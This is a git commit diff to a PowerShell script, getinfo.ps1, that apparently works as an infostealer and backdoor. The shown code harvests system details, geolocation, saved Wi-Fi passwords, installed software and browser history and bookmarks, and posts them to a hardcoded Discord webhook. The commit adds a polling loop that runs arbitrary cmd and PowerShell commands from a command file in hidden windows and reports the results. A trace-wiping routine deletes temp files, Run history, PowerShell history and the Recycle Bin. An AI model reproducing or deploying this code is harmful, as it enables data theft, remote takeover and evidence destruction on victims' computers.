bfc47b0e1c050373767879a0c688d4eff1f49d33
6uard1an <154757568+6uard1an@users.noreply.github.com>
2024-01-29 10:44:42 -0600

    Update getinfo.ps1
    added the listening to changes from "Terminal" and execute code remotely from file command.txt

--- getinfo.ps1
+++ getinfo.ps1
@@ -1,10 +1,16 @@
+###HEAD
 # Set TLS 1.2 as the security protocol
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 #Hide Errors
 $ErrorActionPreference = 'SilentlyContinue'
 # Define Discord webhook URL
-$hookUrl = "your-hook-url"
-#Define sending-to-discord function
+$hookUrl = "https://discord.com/api/webhooks/1200245949126148156/HOwhnUPElKBeBX7_j3WMG8-jMlimPoAM3pTlc-uZMbCESmAPXdzF7YWq1DEYqxxuroKy"
+# Define command URL
+$url = "C:\Users\MEIR\Desktop\RemoteHack\command.txt"
+###/HEAD
+
+###FUNCTIONS
+#Define Uploading to discord
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -14,9 +20,12 @@ function Upload-Discord {
 
     $username = $env:username
     $textChunks = [System.Collections.ArrayList]@()
+    $maxChunks = 2  # Maximum number of chunks to send
+    $retryCount = 0
+    $retryDelay = 2  # Standard delay between retries, in seconds
 
     # Split text into chunks of 2000 characters
-    while ($text.Length -gt 0) {
+    while ($text.Length -gt 0 -and $textChunks.Count -lt $maxChunks) {
         $chunk = $text.Substring(0, [Math]::Min(2000, $text.Length))
         $textChunks.Add($chunk)
         $text = $text.Substring($chunk.Length)
@@ -24,54 +33,88 @@ function Upload-Discord {
 
     # Send each chunk as a separate message with a delay
     foreach ($chunk in $textChunks) {
-        $Body = @{
-            'username' = $username
-            'content' = $chunk
-        }
+        try {
+            $Body = @{
+                'username' = $username
+                'content' = $chunk
+            }
 
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookUrl -Method Post -Body ($Body | ConvertTo-Json)
-        
-        # Introduce a delay (adjust as needed)
-        Start-Sleep -Seconds 1
+            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookUrl -Method Post -Body ($Body | ConvertTo-Json)
+            
+            # Introduce a delay (adjust as needed)
+            Start-Sleep -Seconds 2
+        }
+        catch {
+            $retryCount++
+            Write-Host "Error sending message (Retry $retryCount): $_"
+            
+            if ($_.Exception.Response -is [System.Net.HttpWebResponse]) {
+                $response = $_.Exception.Response
+                if ($response.StatusCode -eq [System.Net.HttpStatusCode]::TooManyRequests) {
+                    $retryAfter = [int]$response.Headers['Retry-After']
+                    Write-Host "Rate limited. Retrying after $retryAfter seconds..."
+                    Start-Sleep -Seconds $retryAfter
+                }
+                else {
+                    $retryDelay = [int]$response.Headers['Retry-After']
+                    Write-Host "Retrying after $retryDelay seconds..."
+                    Start-Sleep -Seconds $retryDelay
+                }
+            }
+            else {
+                Write-Host "Retrying after a standard delay..."
+                Start-Sleep -Seconds $retryDelay
+            }
+
+            # Modify username if the message wasn't accepted
+            $username = "$username 0"
+        }
     }
 }
-
-# Get info about target pc
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-		$GL = $GL -split " "
-		$Lat = $GL[0].Substring(11) -replace ".$"
-		$Lon = $GL[1].Substring(10) -replace ".$" 
-		return $Lat, $Lon
-
-
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
+#leave no trace
+function LeaveNoTrace {
+    # Remove files in the TEMP directory
+    Remove-Item $env:TEMP\* -Recurse -Force
+    # Clear recent Run history in Windows Registry
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    # Remove PowerShell history file
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
+    # Clear the Recycle Bin
+    Clear-RecycleBin -Force
 }
+# Get GeoLocation
+function Get-GeoLocation {
+    try {
+        Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
+        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
+        $GeoWatcher.Start() #Begin resolving current location
 
-#get browserData
+        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
+            Start-Sleep -Milliseconds 100 #Wait for discovery.
+        }  
+
+        if ($GeoWatcher.Permission -eq 'Denied'){
+            Write-Error 'Access Denied for Location Information'
+        } else {
+            $GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
+            $GL = $GL -split " "
+            $Lat = $GL[0].Substring(11) -replace ".$"
+            $Lon = $GL[1].Substring(10) -replace ".$" 
+            return $Lat, $Lon
+        }
+    }
+    # Write Error is just for troubleshooting
+    catch {
+        Write-Error "No coordinates found" 
+        return "No Coordinates found"
+        -ErrorAction SilentlyContinue
+    } 
+}
+# Get browserData
 function Get-BrowserData {
 
     [CmdletBinding()]
-    param (	
+    param (    
         [Parameter(Position=1, Mandatory=$True)]
         [string]$DataType 
     ) 
@@ -107,7 +150,7 @@ function Get-BrowserData {
 
     return $ResultArray
 }
-
+# Get BrowserPath
 function Get-BrowserPath {
     param (
         [Parameter(Position=1, Mandatory=$True)]
@@ -144,11 +187,12 @@ function Get-BrowserPath {
     Write-Warning "Unsupported browser or data type."
     return $null
 }
-#organize collected data#
+###/FUNCTIONS
+
+###BROADCAST
+# Organize collected data
 $allBrowserHistory = Get-BrowserData -DataType 'history' | Out-String
 $allBrowserBookmarks = Get-BrowserData -DataType 'bookmarks' | Out-String
-
-
 $allBrowserData = "HISTORY:`n`n`n`n`n" + $allBrowserHistory + "BOOKMARKS:`n`n`n`n`n" + $allBrowserBookmarks
 $Lat, $Lon = Get-GeoLocation
 $Location = "Latitude: $Lat, Longitude: $Lon"
@@ -158,22 +202,93 @@ $wifi = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-O
 $os = (Get-CimInstance Win32_OperatingSystem).Caption
 $software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
 $computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String
-#collected data:#
+#Final result:
 $data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nLocation: " + $Location + "`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi + "`n`n`n`n`nBROWSERDATA:`n$allBrowserData"
-
-# Example usage
+# Broadcast final result
 Upload-Discord -text "$data"
+###/BROADCAST
 
+###GETCOMMANDS
+function CustomLanguageInterpreter {
+    param(
+        [string]$command
+    )
 
+    # Split the input text into lines
+    $lines = $command -split "`n"
 
+    foreach ($line in $lines) {
+        # Check if the line is not null or empty and starts with '!'
+        if ($line -and $line -match '^!(\w+)(?:\s+(.+))?') {
+            $commandType = $matches[1]
+            $code = $matches[2]
 
+            # Construct the command string
+            switch ($commandType) {
+                'cmd' {
+Start-Process cmd -ArgumentList "/c `$output=$($code | Invoke-Expression); Upload-Discord -text ""Executed Code:`n $code`nResult:`n`$output""" -WindowStyle Hidden
+                }
+                'powershell' {
+Start-Process powershell -ArgumentList "-NoProfile -Command `$output = $($code | Invoke-Expression); Upload-Discord -text ""Executed Code:`n $code`nResult:`n`$output""" -WindowStyle Hidden -NoNewWindow
+                }
+'msgbox' {
+    # Run the PowerShell code to display the MessageBox
+    Invoke-Expression $code
 
-#leave no trace
-# Remove files in the TEMP directory
-Remove-Item $env:TEMP\* -Recurse -Force
-# Clear recent Run history in Windows Registry
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-# Remove PowerShell history file
-Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
-# Clear the Recycle Bin
-Clear-RecycleBin -Force
+    # Construct the PowerShell code for displaying MessageBox
+    $psCode = @"
+    Add-Type -AssemblyName PresentationFramework
+    [System.Windows.MessageBox]::Show('$msgBoxMessage', '$msgBoxTitle', [System.Windows.MessageBoxButton]::$msgBoxButton, [System.Windows.MessageBoxImage]::$msgBoxIcon)
+"@
+
+    # Run the PowerShell code to display the MessageBox
+    Invoke-Expression $psCode
+
+    # Upload to Discord or perform any other actions
+    Upload-Discord -text "Executed code: $code`nMessageBox displayed"
+                }
+                default {
+                    Write-Host "Unknown Command: $commandType"
+                    Upload-Discord -text "Write-Host 'Unknown Command: $commandType'"
+                }
+            }
+        }
+    }
+}
+
+function Check-FileContent {
+    # Get the initial content of the file
+    $previousContent = (Invoke-RestMethod -Uri $url).ToString()
+
+    # Log the initial content
+    Write-Output "Initial File Contents:"
+    Write-Output $previousContent
+
+    # Run the CustomLanguageInterpreter with the initial content
+    CustomLanguageInterpreter -command $previousContent
+
+    # Loop to continuously check for changes
+    while ($true) {
+        # Get the current content of the file
+        $currentContent = (Invoke-RestMethod -Uri $url).ToString()
+
+        # Check if content has changed
+        if ($previousContent -ne $currentContent) {
+            # Log the difference
+            Write-Output "File content has changed:"
+            Write-Output $currentContent
+
+            # Run the CustomLanguageInterpreter with the updated content
+            CustomLanguageInterpreter -command $currentContent
+
+            # Update the previous content
+            $previousContent = $currentContent
+        }
+
+        # Introduce a delay between checks (adjust as needed)
+        Start-Sleep -Seconds 5
+    }
+}
+
+# Run the function separately
+Check-FileContent
